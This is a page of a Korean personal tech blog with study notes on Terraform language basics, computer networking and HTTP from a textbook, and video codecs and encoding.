<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>bastionsofwill</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="bastionsofwill">
<meta property="og:url" content="https://bastionsofwill.github.io/page/2/index.html">
<meta property="og:site_name" content="bastionsofwill">
<meta property="og:locale" content="ko_KR">
<meta property="article:author" content="JY">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="bastionsofwill" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">bastionsofwill</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="검색"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="검색"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://bastionsofwill.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-terraform-lang-basics" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/04/20/terraform-lang-basics/" class="article-date">
  <time class="dt-published" datetime="2022-04-20T13:43:00.000Z" itemprop="datePublished">2022-04-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/04/20/terraform-lang-basics/">Terraform Language 기초</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Terraform은 오픈소스 IaaC툴이며, 이를 위해 자체 Configuration 언어인 Terraform Language를 사용한다. </p>
<h2 id="Terraform-Language-Elements"><a href="#Terraform-Language-Elements" class="headerlink" title="Terraform Language Elements"></a>Terraform Language Elements</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">resource <span class="string">&quot;aws_vpc&quot;</span> <span class="string">&quot;main&quot;</span> &#123;</span><br><span class="line">  cidr_block = var.base_cidr_block</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;BLOCK TYPE&gt; <span class="string">&quot;&lt;BLOCK LABEL&gt;&quot;</span> <span class="string">&quot;&lt;BLOCK LABEL&gt;&quot;</span> &#123;</span><br><span class="line">  <span class="comment"># Block body</span></span><br><span class="line">  &lt;IDENTIFIER&gt; = &lt;EXPRESSION&gt; <span class="comment"># Argument</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Blocks: 컨테이너의 역할을 수행하며, 리소스 등 특정 개체의 설정을 나타낸다.<ul>
<li>block type: 모든 블록은 타입을 갖는다.</li>
<li>labels: 타입에 따라 라벨의 갯수가 정해진다.</li>
<li>body: 다른 Argument와 블록이 중첩될 수 있다.</li>
</ul>
</li>
<li>Arguments: name에 value를 할당하며, block 안에 존재한다.</li>
<li>Expressions: 참조&#x2F;조합되거나 그 자체로 어떤 값이 된다.</li>
</ul>
<h2 id="Modules"><a href="#Modules" class="headerlink" title="Modules"></a>Modules</h2><ul>
<li>Module이란 여러 개의 구성 파일(<code>.tf</code> 또는 <code>.tf.json</code>)이 한 디렉토리에 모인 것을 말한다.</li>
<li>모듈은 같은(top) 레벨의 파일들만으로 구성되며, 하위 디렉토리는 별개의 모듈로 취급되어 구성에 자동으로 포함되지 않는다.</li>
<li>Terraform은 항상 하나의 root module 컨텍스트에서 실행되며, Terraform 구성(configuration)은 root 모듈과 그 child 모듈(root모듈이 호출한 모듈과 그 child)들의 트리 형태이다.</li>
<li><code>module</code> 블록을 통해 child 모듈을 호출할 수 있으며, 아래와 같은 argument를 갖는다.<ul>
<li><code>source</code>: child module의 configuration file path 또는 다운로드 주소</li>
<li><code>version</code>: child module 버전</li>
<li>input variables</li>
<li>meta-arguments: child 모듈을 호출하는 방식을 지정해줄 수 있다.</li>
</ul>
</li>
</ul>
<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul>
<li>Terraform Language에서 가장 중요한 요소</li>
<li>각 Resource 블록은 타입과 로컬 네임, 2개의 라벨을 가지며, 타입과 리소스의 조합은 각 resource의 id로 작용하므로 같은 모듈에서 unique해야 한다.</li>
<li>로컬 네임은 같은 모듈 스코프에서 해당 리소스를 참조하는데 사용된다.</li>
</ul>
<h3 id="Meta-arguments"><a href="#Meta-arguments" class="headerlink" title="Meta-arguments"></a>Meta-arguments</h3><ul>
<li><code>depends_on</code>: 의존성 명시</li>
<li><code>count</code>: 특정 갯수의 인스턴스를 생성(for_each와 동시 사용 불가)</li>
<li><code>for_each</code>: map 또는 string set으로 다수의 인스턴스를 생성(count와 동시 사용 불가)</li>
<li><code>provider</code>: non-default provider configuration 지정</li>
<li><code>lifecycle</code>: 리소스의 생성&#x2F;소멸 관련 조건 지정</li>
<li><code>provisioner</code>: resource 생성 후 별도 행동</li>
</ul>
<h3 id="Resource-Behavior"><a href="#Resource-Behavior" class="headerlink" title="Resource Behavior"></a>Resource Behavior</h3><ul>
<li>Resource 블록을 통해 새로운 객체가 생성될 경우, 해당 객체의 id가 Terraform state에 저장되어 관리된다.</li>
<li>이미 state에 존재하는 Resource 블록이 있을 경우, configuration과 객체를 비교하여 필요시 객체를 configuration에 맞게 update한다.</li>
</ul>
<h2 id="Data-Sources"><a href="#Data-Sources" class="headerlink" title="Data Sources"></a>Data Sources</h2><ul>
<li><code>data</code>블록은 ‘data source’와 ‘local name’ 2개의 라벨을 가지며, 특정 data source로부터 데이터를 읽어 와서 local name 아래에 결과를 export한다.</li>
<li><code>variable</code> 블록과 마찬가지로 참조에 의한 값을 할당한다는 공통점이 있지만, variable 블록은 Terraform configuration 안에서 정의되는 반면 data 블록은 클라우드 인프라, 애플리케이션 등 외부에서 발생하는 데이터를 참조한다는 차이점이 있다.</li>
</ul>
<h2 id="Providers"><a href="#Providers" class="headerlink" title="Providers"></a>Providers</h2><ul>
<li>Providers Terraform에서 클라우드&#x2F;SaaS&#x2F;기타 API 제공자와 상호작용하기 위해 사용하는 플러그인이다.</li>
<li>Provider는 resource 및 data source의 집합을 추가해 준다.</li>
</ul>
<h2 id="Variables-and-Outputs"><a href="#Variables-and-Outputs" class="headerlink" title="Variables and Outputs"></a>Variables and Outputs</h2><ul>
<li><code>variable</code> 블록은 input variable을 정의하는 데 쓰인다.<ul>
<li><code>default</code>: 디폴트 값</li>
<li><code>type</code>: value의 타입(string, number, bool + collections 등의 복합 타입)</li>
<li><code>description</code></li>
<li><code>validation</code>: <code>condition</code> argument를 통해 변수가 가질 수 있는 값의 조건을 지정할 수 있으며, <code>error_message</code>로 invalid할 경우 에러 메시지를 지정할 수 있다.</li>
<li><code>sensitive</code>: boolean. Terraform UI output에서 마스킹 여부를 결정</li>
<li><code>nullable</code></li>
</ul>
</li>
<li><code>output</code> 블록은 모듈 외부로 값을 export할 때 사용된다.<ul>
<li><code>value</code></li>
<li><code>description</code></li>
<li><code>sensitive</code></li>
<li><code>depends_on</code>: 의존 관계를 명시적(explicit)으로 표현할 때 쓰인다.</li>
</ul>
</li>
</ul>
<h3 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h3><p><a target="_blank" rel="noopener" href="https://www.terraform.io/language">https://www.terraform.io/language</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2022/04/20/terraform-lang-basics/" data-id="cl6fthswv001beon9celw8vbw" data-title="Terraform Language 기초" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Terraform/" rel="tag">Terraform</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/infrastructure/" rel="tag">infrastructure</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-cntda-02" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/04/11/cntda-02/" class="article-date">
  <time class="dt-published" datetime="2022-04-11T01:16:50.000Z" itemprop="datePublished">2022-04-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/04/11/cntda-02/">주말 네트워크 공부 02 - 네트워크 애플리케이션의 원리와 HTTP</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="네트워크-애플리케이션-구조"><a href="#네트워크-애플리케이션-구조" class="headerlink" title="네트워크 애플리케이션 구조"></a>네트워크 애플리케이션 구조</h2><h3 id="클라이언트-x2F-서버-구조"><a href="#클라이언트-x2F-서버-구조" class="headerlink" title="클라이언트&#x2F;서버 구조"></a>클라이언트&#x2F;서버 구조</h3><ul>
<li>웹 애플리케이션과 같이, 항상 켜져있는 서버 호스트가 다른 많은 클라이언트 호스트의 요청을 처리하는 구조</li>
<li>클라이언트는 직접 통신하지 않음</li>
<li>서버가 고정 IP주소라는 잘 알려진 주소를 가짐</li>
<li>하나의 서버 호스트가 클라이언트의 모든 요청을 처리하기 어려울 경우, 데이터 센터 등으로 가상 서버를 생성<h3 id="P2P-구조"><a href="#P2P-구조" class="headerlink" title="P2P 구조"></a>P2P 구조</h3></li>
<li>항상 켜져있는 기반 서버에 최소 의존 또는 전혀 의존하지 않음</li>
<li>간헐적으로 연결된 호스트 쌍이 서로 직접 통신</li>
<li>클라이언트-서버 구조와 P2P 요소를 결합한 하이브리드 구조도 존재</li>
<li>자가 확장성을 가지며, 비용 효율적</li>
</ul>
<h2 id="프로세스-간-통신"><a href="#프로세스-간-통신" class="headerlink" title="프로세스 간 통신"></a>프로세스 간 통신</h2><ul>
<li>서로 다른 2개의 종단 시스템에서 각각의 프로세스는 메시지 교환을 통해 통신<h3 id="프로세스-네트워크-인터페이스"><a href="#프로세스-네트워크-인터페이스" class="headerlink" title="프로세스 - 네트워크 인터페이스"></a>프로세스 - 네트워크 인터페이스</h3></li>
<li>프로세스는 소켓(socket, 호스트의 애플리케이션 레이어와 트랜스포트 레이어 간 인터페이스)을 통해 네트워크로 메시지를 주고받음</li>
<li>애플리케이션 개발자는 트랜스포트 계층에는 트랜스포트 프로토콜의 선택과 약간의 매개변수만 통제가 가능</li>
</ul>
<h2 id="TCP와-UDP"><a href="#TCP와-UDP" class="headerlink" title="TCP와 UDP"></a>TCP와 UDP</h2><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><ul>
<li>연결 지향형 서비스: 클라이언트와 서버는 전송 제어 정보를 교환하는 핸드셰이크 단계를 거친 후에 연결이 생성되어 양방향 메시지 전달이 가능해지고, 메시지 전송이 끝나면 연결을 끊는다.</li>
<li>신뢰적 데이터 전송 서비스</li>
<li>SSL: 암호화를 제공하지 않는 TCP에 보안성을 갖추기 위해 애플리케이션 레이어에 구현된 암호화 프로토콜</li>
<li>혼잡 제어 방식: 인터넷의 전체 성능 향상을 위해 각 연결의 대역폭 조정 및 제한<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3></li>
<li>최소 서비스 모델: 비연결형, 비신뢰적 데이터 전송 서비스</li>
<li>혼잡 제어 방식 미포함</li>
</ul>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><ul>
<li>HTTP는 클라이언트 프로그램(웹 브라우저)과 서버 프로그램(웹 서버)으로 구현된다.</li>
<li>웹 페이지를 구성하는 각 객체의 URL은 1)해당 객체가 존재하는 서버의 호스트 네임과 2)객체의 경로 이름을 가진다.</li>
<li>HTTP는 TCP를 기반으로 하며, 브라우저와 서버의 프로세스는 소켓 인터페이스를 통해 TCP 통신을 진행한다.</li>
<li>HTTP는 상태가 없다(stateless).</li>
</ul>
<h2 id="HTTP-메시지-포맷"><a href="#HTTP-메시지-포맷" class="headerlink" title="HTTP 메시지 포맷"></a>HTTP 메시지 포맷</h2><h3 id="HTTP-req-메시지"><a href="#HTTP-req-메시지" class="headerlink" title="HTTP req 메시지"></a>HTTP req 메시지</h3><ul>
<li>request 라인: HTTP req 메시지의 첫 번째 줄이다.<ul>
<li>메서드 필드(GET, POST, HEAD, PUT, DELETE, etc.)<ul>
<li>GET: URL에 해당하는 객체를 요청한다.</li>
<li>POST: 사용자가 입력한 form 정보를 전달을 포함한 객체를 요청한다.</li>
<li>HEAD: GET과 유사하나, 객체는 보내지 않고 HTTP 메시지 res만 요청한다.</li>
<li>PUT: 웹 서버에 업로드할 객체가 필요한 애플리케이션이 사용한다.</li>
<li>DELETE: 웹 서버에 있는 객체의 삭제를 요청한다.</li>
</ul>
</li>
<li>URL 필드</li>
<li>HTTP 버전 필드</li>
</ul>
</li>
<li>header 라인: HTTP req 메시지의 나머지 줄이다.<ul>
<li>Host: 객체가 존재하는 호스트 네임이며, 웹 프록시 캐시가 요구하는 정보이다.</li>
<li>Connection: 지속 연결을 사용할지 여부</li>
<li>User-agent: 브라우저 타입</li>
<li>Accept-language: 선호 언어</li>
</ul>
</li>
<li>entity body: GET에서는 empty 상태이며, POST에서는 사용자가 입력한 form 정보를 포함한다.<h3 id="HTTP-res-메시지"><a href="#HTTP-res-메시지" class="headerlink" title="HTTP res 메시지"></a>HTTP res 메시지</h3></li>
<li>초기 상태 라인<ul>
<li>HTTP 버전 필드</li>
<li>상태 코드 및 메시지<ul>
<li>200 OK</li>
<li>301 Moved Permanently</li>
<li>400 Bad Request</li>
<li>404 Not Found</li>
<li>505 HTTP Version Not Supported</li>
</ul>
</li>
</ul>
</li>
<li>header 라인:<ul>
<li>Connection: 클라이언트에게 메시지를 보낸 후 연결을 지속할지 여부</li>
<li>Date: 서버가 HTTP res를 생성하고 보낸 시간</li>
<li>Server: 웹 서버 타입(req의 User-agent와 유사)</li>
<li>Last-Modified: 객체 생성 또는 최근 수정 시간이며, 캐싱 기능에 중요하게 사용된다.</li>
<li>Content-Length: 객체 크기</li>
<li>Conent-Type: 객체 타입</li>
</ul>
</li>
<li>entity body</li>
</ul>
<h2 id="쿠키"><a href="#쿠키" class="headerlink" title="쿠키"></a>쿠키</h2><ul>
<li>HTTP는 stateless하므로, 서버가 사용자를 추적하기 위해 쿠키(cookie)를 사용한다.</li>
<li>쿠키는 아래와 같은 4개 요소로 작동한다.<ul>
<li>HTTP res 메시지 쿠키 헤더 라인: 서버는 사용자 식별을 위한 ID를 생성하고 Set-cookie: 헤더에 이를 포함한다.</li>
<li>브라우저 쿠키 파일: 브라우저는 이를 자신이 관리하는 쿠키 파일에 저장한다.</li>
<li>HTTP req 메시지 쿠키 헤더 라인: 브라우저는 쿠키 파일에 현재 사이트에서 발급받은 쿠키가 있을 경우 이를 Cookie: 헤더로 포함하여 req 메시지를 전달한다.</li>
<li>서버(사이트) 백엔드 데이터베이스: 쿠키로 식별한 각 사용자의 활동 정보가 저장된다.</li>
</ul>
</li>
</ul>
<h2 id="웹-캐싱"><a href="#웹-캐싱" class="headerlink" title="웹 캐싱"></a>웹 캐싱</h2><ul>
<li>웹 캐시는 프록시 서버라고도 불리며, origin을 대신하여 HTTP req를 처리해줄 수 있는 네트워크 개체이다.</li>
<li>이를 위해 자체 저장 디스크를 갖추고 최근 호출된 객체의 사본을 저장한다.</li>
<li>브라우저 설정을 통해 모든 HTTP 요청을 웹 캐시를 거치도록 구성할 수 있다.</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2022/04/11/cntda-02/" data-id="cl6fthswl000keon99l8r2k2g" data-title="주말 네트워크 공부 02 - 네트워크 애플리케이션의 원리와 HTTP" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/book/" rel="tag">book</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/weekend/" rel="tag">weekend</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-cntda-01" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/04/10/cntda-01/" class="article-date">
  <time class="dt-published" datetime="2022-04-10T00:07:16.000Z" itemprop="datePublished">2022-04-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/04/10/cntda-01/">주말 네트워크 공부 01 - 컴퓨터 네트워크와 인터넷</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="구성요소로-본-인터넷"><a href="#구성요소로-본-인터넷" class="headerlink" title="구성요소로 본 인터넷"></a>구성요소로 본 인터넷</h2><ul>
<li>인터넷은 여러 개의 컴퓨팅 장치(종단 시스템)를 연결하는 컴퓨터 네트워크</li>
<li>종단 시스템은 통신 링크(물리 매체)와 패킷 스위치의 네트워크로 연결</li>
<li>packet &#x3D; segment(데이터의 조각) + header</li>
<li>가장 널리 사용되는 패킷 스위치는 라우터와 링크-레이어 스위치로, 최종 목적지 방향으로 패킷을 전달하는 역할을 수행하며, 링크-레이어 스위치는 주로 액세스 네트워크에서, 라우터는 네트워크 코어에서 사용</li>
</ul>
<h2 id="서비스-측면에서-본-인터넷"><a href="#서비스-측면에서-본-인터넷" class="headerlink" title="서비스 측면에서 본 인터넷"></a>서비스 측면에서 본 인터넷</h2><ul>
<li>인터넷에 접속된 종단 시스템(출발지)은 인터넷 인프라 구조에게 다른 종단 시스템(목적지)에서 수행되는 프로그램에 데이터를 어떻게 전달하도록 요구하는지 명시하는 API(Application Programing Interface)를 제공</li>
<li>API는 송신 프로그램이 따라야 하는 규칙의 집합이며, 인터넷은 이 규칙에 따라 데이터를 목적지로 전달</li>
</ul>
<h2 id="액세스-네트워크-네트워크-코어"><a href="#액세스-네트워크-네트워크-코어" class="headerlink" title="액세스 네트워크, 네트워크 코어"></a>액세스 네트워크, 네트워크 코어</h2><ul>
<li>액세스 네트워크: 종단 시스템 간 경로 중 출발지와 첫 번째 라우터를 연결하는 네트워크</li>
<li>네트워크 코어: 패킷 스위치와 링크의 메시(mesh)</li>
<li>링크, 스위치의 네트워크를 통한 데이터의 전송에는 회선 교환과 패킷 교환 방식이 존재</li>
</ul>
<h2 id="인터넷-프로토콜-스택"><a href="#인터넷-프로토콜-스택" class="headerlink" title="인터넷 프로토콜 스택"></a>인터넷 프로토콜 스택</h2><ul>
<li>네트워크 프로토콜은 레이어 구조를 가지며, 각 프로토콜은 한 레이어에 속하며, 상위 레이어는 하위 레이어의 서비스를 이용할 수 있다.</li>
<li>인터넷 프로토콜 스택은 Application, Transport, Network, Link, Physical 5개 레이어로 구성된다.<h3 id="Application-Layer"><a href="#Application-Layer" class="headerlink" title="Application Layer"></a>Application Layer</h3></li>
<li>인터넷에서 사용하는 애플리케이션 계층 프로토콜은 대표적으로 HTTP, SMTP, FTP등이 있다.</li>
<li>애플리케이션 레이어에서의 정보 패킷을 메시지(message)라 부른다.<h3 id="Transport-Layer"><a href="#Transport-Layer" class="headerlink" title="Transport Layer"></a>Transport Layer</h3></li>
<li>애플리케이션 레이어로부터 전달받은 메시지를 전송하는 서비스를 제공한다.</li>
<li>인터넷에서는 TCP, UDP 2가지의 트랜스포트 프로토콜이 사용된다.</li>
<li>트랜스포트 레이어에서의 정보 패킷을 세그먼트(segment)라 부른다.<h3 id="Network-Layer"><a href="#Network-Layer" class="headerlink" title="Network Layer"></a>Network Layer</h3></li>
<li>출발지 호스트의 트랜스포트 레이어로부터 전달받은 세그먼트를 목적지 호스트의 트랜스포트 레이어로 전송하는 서비스를 제공한다.</li>
<li>네트워크 레이어에서의 정보 패킷을 데이터그램(datagram)이라 부른다.</li>
<li>IP는 데이터그램의 필드 및 네트워크 요소(종단 시스템 및 라우터)가 각 필드에 어떻게 동작하는지 정의하는, 유일한 프로토콜이다.</li>
<li>라우팅 프로토콜 역시 네트워크 레이어에 속하며, 인터넷은 다양한 라우팅 프로토콜을 가지고 있다.<h3 id="Link-Layer"><a href="#Link-Layer" class="headerlink" title="Link Layer"></a>Link Layer</h3></li>
<li>한 노드(호스트 또는 패킷 스위치)에서 다른 노드로 패킷을 전달하는 서비스를 제공한다.</li>
<li>이더넷, 와이파이, DOCSIS(Data Over Cable Service Interface Specification) 등이 있다.</li>
<li>링크 레이어에서의 정보 패킷을 프레임(frame)이라 부른다.<h3 id="Physical-Layer"><a href="#Physical-Layer" class="headerlink" title="Physical Layer"></a>Physical Layer</h3></li>
<li>한 노드에서 다른 노드로 프레임 내부의 각 비트를 전달하는 기능을 담당한다.</li>
</ul>
<h2 id="캡슐화-Encapsulation"><a href="#캡슐화-Encapsulation" class="headerlink" title="캡슐화(Encapsulation)"></a>캡슐화(Encapsulation)</h2><p><img src="/images/network_layers.png"></p>
<ul>
<li>패킷은 각 레이어를 거치면서, 상위 계층에서 받은 정보에 헤더를 추가하면서 데이터를 캡슐화한다.</li>
</ul>
<h2 id="네트워크-공격"><a href="#네트워크-공격" class="headerlink" title="네트워크 공격"></a>네트워크 공격</h2><ul>
<li>호스트에서 악성코드 실행</li>
<li>네트워크 인프라 공격(DoS)</li>
<li>패킷 탐지(Sniffing)</li>
<li>패킷 위장(Spoofing)</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://bastionsofwill.github.io/2022/04/10/cntda-01/" data-id="cl6fthswk000ieon93esd7etk" data-title="주말 네트워크 공부 01 - 컴퓨터 네트워크와 인터넷" class="article-share-link">공유</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/book/" rel="tag">book</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/weekend/" rel="tag">weekend</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-encoding-and-video-codecs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/01/12/encoding-and-video-codecs/" class="article-date">
  <time class="dt-published" datetime="2022-01-12T13:04:09.000Z" itemprop="datePublished">2022-01-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/01/12/encoding-and-video-codecs/">인코딩과 비디오 코덱</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Video-Codecs-and-Encoding"><a href="#Video-Codecs-and-Encoding" class="headerlink" title="Video Codecs and Encoding"></a>Video Codecs and Encoding</h2><h3 id="Video-Encoding"><a href="#Video-Encoding" class="headerlink" title="Video Encoding"></a>Video Encoding</h3><p>비디오 인코딩이란 비디오 원본을 다양한 기기에 호환되는 디지털 형태로 변환하는 과정을 말한다. 라이브 스트리밍에서는 데이터의 빠른 전달과 재생을 위해 비디오 인코딩이 필수적이다.<br>인코딩은 다양한 기기 또는 소프트웨어에서 실행되며, 유명한 소프트웨어로는 Vmix, Wirecast, OBS Studio 등이 있다.<br>인코더는 비디오&#x2F;오디오 코덱을 사용하여 전달이 용이한 크기로 비디오 원본을 압축한다. 간단히 말하자면, 인코딩은 압축 과정, 코덱은 압축의 수단이라고 볼 수 있다.</p>
<h3 id="What-Is-a-Codec"><a href="#What-Is-a-Codec" class="headerlink" title="What Is a Codec?"></a>What Is a Codec?</h3><p>Codec은 coder-decoder, compressor-decompressor의 준말로, 스트리밍의 경우 저장 및 전송을 위해 손실 압축을 적용하며, 추후 재생을 위해 복원된다. H.264는 가장 보편적인 비디오 코덱이며, AAC(Advanced Audio Coding)은 가장 보편적인 오디오 코덱이다.</p>
<h3 id="What-Is-a-Video-Container-Format"><a href="#What-Is-a-Video-Container-Format" class="headerlink" title="What Is a Video Container Format?"></a>What Is a Video Container Format?</h3><p>압축 후, 스트림의 컴포넌트들은 wrapper 또는 파일 포맷으로 패키징된다. 이러한 파일은 오디오&#x2F;비디오 코덱, CC, 메타데이터를 포함한다. 보편적인 컨테이너로는 .mp4, .mov, .ts, .wmv 등이 있다.</p>
<h3 id="Video-Codecs-vs-Containers-What’s-the-Difference"><a href="#Video-Codecs-vs-Containers-What’s-the-Difference" class="headerlink" title="Video Codecs vs Containers: What’s the Difference?"></a>Video Codecs vs Containers: What’s the Difference?</h3><p>코덱은 비디오 원본을 압축하고 복원하며, 전송을 위해 손실 압축을 거치면서 데이터 손실이 발생한다. 반면 비디오 컨테이너는 비디오&#x2F;오디오 코덱, 자막이나 미리보기 이미지 등의 메타데이터를 모두 저장하여 어떤 프로그램이 스트림을 처리하는지를 결정한다.</p>
<h3 id="Best-Video-Codecs-for-Streaming"><a href="#Best-Video-Codecs-for-Streaming" class="headerlink" title="Best Video Codecs for Streaming"></a>Best Video Codecs for Streaming</h3><p>차세대 코덱은 높은 인코딩 성능과 질을 보여줄 수 있는 반면, 기기 호환성을 보장하기 위해서는 레거시 코덱도 지원하여야 한다. 일례로, 넷플릭스는 최신 코덱 지원을 지속적으로 추가하면서도 서비스 시작부터 지원하였던 VC1 코덱을 계속 지원한다.</p>
<h3 id="H-264-x2F-AVC-Advanced-Video-Coding"><a href="#H-264-x2F-AVC-Advanced-Video-Coding" class="headerlink" title="H.264&#x2F;AVC(Advanced Video Coding)"></a>H.264&#x2F;AVC(Advanced Video Coding)</h3><p>오늘날 대다수의 인코딩 결과는 H.264(&#x3D;AVC) 파일이다. 주로 AAC 오디오 코덱과 결합되어 사용되며 .mp4, .mov, .F4v, .3GP, .ts 컨테이너에 패키징될 수 있다.<br>H.264는 거의 모든 기기에서 재생이 가능하며, 높은 품질의 비디오 스트림을 전달하면서도 로열티에 대한 우려가 가장 적다. H.264는 넓은 기기 지원 범위를 바탕으로 높은 점유율을 보여주지만, 4K, HDR(High Dynamic Range) 컨텐츠에는 적합하지 않다. H.264는 빠른 인코딩 속도를 바탕으로 라이브 생성(Live Origination)- 과 Transcoding에 강점을 보이므로 low-latency streaming에 적합하다.</p>
<h3 id="VP9"><a href="#VP9" class="headerlink" title="VP9"></a>VP9</h3><p>Google이 개발한 VP9은 로열티가 없는 H.265의 오픈소스 대체 코덱이다. Google의 YouTube와 Chrome 브라우저가 VP9을 지원하며, 안드로이드 기기, Firefox, Safari, 신형 iOS 기기 역시 이를 지원한다. 또, 많은 WebRTC 워크플로우에서도 VP9을 사용한다. 고성능 비디오에 적합하면서 H.264에 이어 2위의 브라우저&#x2F;기기 호환성을 보여주어 VP9의 활용폭은 넓어지고 있으며, YouTube와 Netflix의 VP9 사용은 이러한 흐름을 주도할 것으로 보인다.</p>
<h3 id="H-265-x2F-HEVC-High-Efficiency-Video-Coding"><a href="#H-265-x2F-HEVC-High-Efficiency-Video-Coding" class="headerlink" title="H.265&#x2F;HEVC(High Efficiency Video Coding)"></a>H.265&#x2F;HEVC(High Efficiency Video Coding)</h3><p>H.264의 후속으로 MPEG(Moving Picture Experts Group, ISO&#x2F;IEC 산하 그룹)에서 개발된 H.265는 압축 효율성 향상과 8K 해상도 지원을 목표로 하며, 실제로 H.264보다 더 작은 결과물 파일을 생성하면서 스트림을 재생하는데 요구하는 대역폭은 더 낮으므로 고해상도 스트리밍에 적합하다. 하지만 코덱 사용 로열티와 특허, 저작권에 대한 불명확성이 있어서 시장 점유율과 호환성이 낮은 편이다. 다만, 대부분의 스마트TV(Living room device)에서 지원되기 때문에 고해상도 OTT 콘텐츠를 제공할 경우에는 H.265가 많이 사용된다.</p>
<h3 id="AV1-AOMedia-Video-1"><a href="#AV1-AOMedia-Video-1" class="headerlink" title="AV1(AOMedia Video 1)"></a>AV1(AOMedia Video 1)</h3><p>H.265의 로열티 문제로 인해 Amazon, Netflix, Google, Microsoft, Cisco, Mozila는 AOMedia(Alliance for Open Media)를 결성하여 H.265의 오픈소스 대체 코덱 AV1을 만들었다. 다만 역사가 짧기 때문에 점유율이 높지 않으며, 인코딩 시간이 오래 걸린다는 단점도 있다.</p>
<h3 id="Encoding-vs-Transcoding"><a href="#Encoding-vs-Transcoding" class="headerlink" title="Encoding vs. Transcoding"></a>Encoding vs. Transcoding</h3><p>Transcoding은 인코딩된 파일을 디코딩하여 변환하는 것을 말한다. 이는 데이터를 보다 일반적인 코덱으로 재인코딩하거나, 비디오를 저화질로 변환(transize)하거나, 파일의 비트레이트를 변환(transrate)하거나, 보다 확장성이 높은 프로토콜로 변환(transmux: transcode-multiplexing)하는 등 다양한 과정을 포함한다. 트랜스코딩이 끝나면, 미디어 서버는 파일을 다시 압축한다.</p>
